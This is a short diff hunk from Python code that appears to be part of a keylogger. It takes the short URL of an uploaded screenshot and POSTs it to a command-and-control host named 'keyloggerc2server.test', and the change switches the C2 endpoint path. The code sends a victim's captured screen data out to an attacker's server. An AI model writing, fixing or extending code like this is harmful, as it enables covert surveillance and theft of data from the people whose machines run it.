@@ -62,7 +62,7 @@ def jul():
         data = response.json()
         print(data['data']['file']['url']['short'])
         urlscreenshot = data['data']['file']['url']['short']
-        url = "http://keyloggerc2server.test/api/store-string"
+        url = "http://keyloggerc2server.test/api/url"
         params = {"string": urlscreenshot}
         response = requests.post(url, params=params)
         print(response.text)
